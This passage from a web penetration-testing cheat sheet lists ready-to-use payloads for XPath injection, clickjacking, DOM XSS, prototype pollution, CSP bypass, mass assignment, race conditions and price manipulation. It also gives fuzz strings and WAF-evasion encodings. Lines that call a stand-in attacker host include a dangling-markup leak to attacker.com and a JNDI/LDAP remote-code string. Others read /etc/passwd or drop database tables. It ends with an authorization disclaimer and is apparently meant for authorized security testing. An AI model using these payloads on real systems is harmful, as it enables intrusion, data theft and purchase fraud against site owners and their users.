| **Attribute Bypass** | `' or 1=1 or ''='` | Alternative always-true expression. | Inject into XPath query field. | All nodes returned. | 🔴 High |
| **Data Extraction (string-length)** | `' and string-length(//user[1]/password)=8 and '1'='1` | Infers data by measuring field length. | Vary the length; observe response changes. | Different responses confirm password length. | 🔴 High |

# Client-Side Attacks

## Clickjacking

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Basic PoC** | `<iframe src="https://target.com/settings" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>` | Overlays invisible iframe over attacker's page. | Host PoC page; visit target in supported browser. | Iframe loads — missing `X-Frame-Options` or CSP. | 🟡 Medium |
| **Drag-and-Drop** | Combine invisible iframe with drag UI | Tricks users into dragging content from target to attacker-controlled element. | Host PoC; demonstrate drag interaction. | Sensitive data dragged to attacker page. | 🟡 Medium |

**Mitigation:** Set `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.

## DOM-Based Attacks

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **DOM XSS via location.hash** | `https://target.com/page#<img src=x onerror=alert(1)>` | Payload injected via fragment, processed by client JS. | Append payload to URL hash. | Alert fires — `location.hash` written to innerHTML. | 🔴 High |
| **DOM XSS via postMessage** | `window.opener.postMessage('<img src=x onerror=alert(1)>','*')` | Sends malicious message to vulnerable message handler. | Open target in popup; send postMessage. | Alert fires if origin not validated. | 🔴 High |
| **Prototype Pollution** | `?__proto__[isAdmin]=true` | Pollutes JavaScript object prototype to inject properties. | Inject into URL query or JSON body. | `isAdmin` available on all objects — privilege escalated. | 🔴 High |
| **DOM Clobbering** | `<a id="config"><a id="config" name="isAdmin" href="true">` | Overrides `window.config` with a DOM element. | Inject HTML into a field rendered in DOM. | JS code reads DOM element as config object. | 🟡 Medium |

## Content Security Policy (CSP) Bypass

| Name | Technique | Description | Success Indicator | Risk |
|:-----|:----------|:------------|:-----------------|:-----|
| **Unsafe-inline present** | Check for `'unsafe-inline'` in CSP | Any inline script or event handler executes. | CSP header contains `'unsafe-inline'`. | 🔴 High |
| **JSONP endpoint** | Use whitelisted JSONP domain | If a whitelisted domain has a JSONP endpoint, it can be abused for script injection. | `script.src = 'https://whitelisted.com/jsonp?callback=alert(1)'` loads. | 🔴 High |
| **Angular CDN abuse** | Load AngularJS from `ajax.googleapis.com` (if whitelisted) | Old AngularJS template syntax bypasses CSP. | `{{constructor.constructor('alert(1)')()}}` executes. | 🔴 High |
| **Nonce reuse** | Capture nonce; reuse in injected script | If nonce is predictable or reused across requests. | Injected `<script nonce="captured">alert(1)</script>` executes. | 💀 Critical |
| **Dangling markup** | `<img src='https://attacker.com/?leak=` | Exfiltrates HTML content via CSP-compliant img src. | Attacker receives partial page HTML. | 🟡 Medium |

# Business Logic

## Mass Assignment

*Assigning unexpected parameters that the server shouldn't accept from clients.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Admin Flag** | `{"username":"user","password":"pass","isAdmin":true}` | Injects an admin flag into user registration. | Add extra fields to registration/update POST body. | Account created with admin privileges. | 💀 Critical |
| **Price Override** | `{"product_id":1,"quantity":1,"price":0.01}` | Sends a lower price in the order request. | Intercept purchase request; change price field. | Order placed at attacker-chosen price. | 💀 Critical |
| **Role Escalation** | `{"role":"superadmin"}` | Injects a higher role field. | Add `role` field to profile update request. | Role elevated in the application. | 💀 Critical |

## Race Conditions

*Exploiting timing windows to perform multiple operations that should only be allowed once.*

| Name | Technique | Description | How to Test | Success Indicator | Risk |
|:-----|:----------|:------------|:------------|:-----------------|:-----|
| **Coupon Reuse** | Send 10+ coupon redemption requests simultaneously | Multiple redemptions processed before first is committed. | Use Burp Repeater "send in parallel" or Turbo Intruder. | Coupon applied multiple times. | 🔴 High |
| **Double Spend** | Parallel withdrawal requests exceeding balance | Balance checked before deduction — window allows double spend. | Send two $500 withdrawal requests simultaneously with $500 balance. | Both withdrawals succeed. | 💀 Critical |
| **Account Registration** | Simultaneous registration of same username | Two accounts created with identical unique field. | Send parallel registration requests with same email. | Duplicate accounts created. | 🟡 Medium |
| **Like/Vote Inflation** | Rapid repeat vote/like actions | Vote counted multiple times due to race condition. | Burp Intruder: send 100 requests simultaneously. | Vote count inflated beyond 1. | 🟡 Medium |

## Price Manipulation

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Negative Quantity** | `{"quantity": -1}` | Negative quantity reverses charge direction. | Set quantity to -1 in order request. | Credit applied instead of charge. | 💀 Critical |
| **Zero Price** | `{"price": 0}` | Set price to zero if accepted from client. | Modify price in request body. | Item purchased for free. | 💀 Critical |
| **Integer Overflow** | `{"quantity": 2147483648}` | Overflows integer to wrap to negative/zero. | Send max int value as quantity. | Total price wraps to free or minimal. | 🔴 High |
| **Decimal Precision** | `{"amount": 0.00001}` | Below minimum charge threshold — rounds to zero. | Send very small decimal values. | Transaction rounds down to zero. | 🟡 Medium |

# Fuzzing & Brute Force

## Generic Fuzz Strings

*Use these across all input types to discover unexpected behavior.*

```
'
"
`
<
>
&
|
;
!
@
#
$
%
^
*
(
)
{
}
[
]
\
/
../
../../
..%2F
%00
%0a
%0d
\n
\r
\r\n
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*|
,
1=1
' OR 1=1--
'; DROP TABLE users--
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
file:///etc/passwd
../../../../etc/passwd
%2e%2e%2f%2e%2e%2f
0x27
0x3c0x73 (hex encoding of <s)
${jndi:ldap://attacker.com/a}
```

## Encoding Variations

Apply any payload in these encodings to bypass WAFs and filters:

| Encoding | Example of `<script>` | Purpose |
|:---------|:----------------------|:--------|
| **URL Encoded** | `%3Cscript%3E` | Bypass URL-based filters |
| **Double URL Encoded** | `%253Cscript%253E` | Bypass double-decode filters |
| **HTML Entity** | `&lt;script&gt;` | Bypass HTML entity stripping |
| **HTML Hex Entity** | `&#x3C;script&#x3E;` | Alternative HTML entity form |
| **HTML Decimal Entity** | `&#60;script&#62;` | Decimal HTML entity |
| **Unicode** | `\u003cscript\u003e` | JavaScript string encoding |
| **Base64** | `PHNjcmlwdD4=` | When app decodes base64 before processing |
| **Hex** | `\x3cscript\x3e` | Hex escape in some contexts |
| **UTF-7** | `+ADw-script+AD4-` | Legacy encoding (IE, old configs) |
| **Null Byte** | `<scr%00ipt>` | Null byte splits keyword |
| **Case Variation** | `<ScRiPt>` | Bypasses case-sensitive keyword blacklists |
| **Tab/Newline** | `<scr\tipt>` | Whitespace injection between characters |
| **Comment Insertion** | `<sc/**/ript>` | Comment inside tag name |
| **SVG Encoding** | Encode payload within SVG CDATA | Embed arbitrary content in SVG |

# Ethical & Legal Reminder

## Disclaimer

> - Always obtain **written authorization** before testing.
> - Test in **isolated environments** or with explicit scope from the target owner.
> - Never use these payloads against systems you do not own or have permission to assess.
> - Follow **responsible disclosure** policies when reporting findings.
> - Document all testing activity with timestamps and scope.
